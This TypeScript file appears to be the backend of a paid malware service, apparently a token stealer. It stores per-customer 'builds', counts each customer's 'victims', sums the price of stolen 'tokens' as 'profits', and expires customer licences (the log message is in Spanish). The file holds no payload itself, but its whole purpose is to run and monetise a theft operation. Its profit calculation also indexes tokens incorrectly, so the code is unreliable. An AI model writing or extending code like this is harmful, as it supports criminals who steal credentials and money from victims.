import { Database } from '#lib/Database.js';
import { Db as Configuration } from '#lib/Configuration.js';
const db = await Database.getInstance(Configuration).connect();

const getBuilds = async (id: string): Promise<Array<Record<string, string>>> => {
	const collection = db.collection('builds');
	const builds = await collection.find({ 'owner.id': id }).toArray();
	return builds as Array<Record<string, string>>;
};

const getVictims = async (id: string): Promise<number[]> => {
	const collection = db.collection('victims');
	const builds = (await getBuilds(id)).map(({ id }) => id);
	const victims = await collection.find({ id: { $in: builds } }).toArray();

	const initialValue: number = 0;
	const profits = victims.reduce((sum, victim, index) => sum + victim.tokens[index].price, initialValue);
	return [victims.length, profits];
};

export const getProfile = async (id: string): Promise<IProfile | undefined> => {
	try {
		const collection = db.collection('users');
		const user = (await collection.findOne({ id })) as IUser | null;
		if (!user) throw Error('User not found!');
		if (user.isBan) throw Error('User is banned!');

		const [victims, profits] = await getVictims(id);
		const builds = (await getBuilds(id)).length;

		return {
			id: user.id,
			bio: user.bio,
			subscription: user.subscription,
			victims,
			builds,
			profits
		} as IProfile;
	} catch (error) {
		return undefined;
	}
};



export const expireDate = async () => {
	const collection = db.collection('users');
	const date = new Date();
	const users = await collection.find().toArray();
	const customers = users.filter((user) => user?.subscription && user.subscription.expires != Infinity);
	if (!customers || !customers.length) return;
	customers.forEach(async ({ id, username, subscription }) => {
		if (date.getTime() === subscription.expires || new Date(subscription.expires) < date) {
			await collection.findOneAndUpdate({ id }, {
				$unset: {
					subscription
				}
			});
			console.log(`Licencia de ${username} ha expirado!`);
		}
	});
}
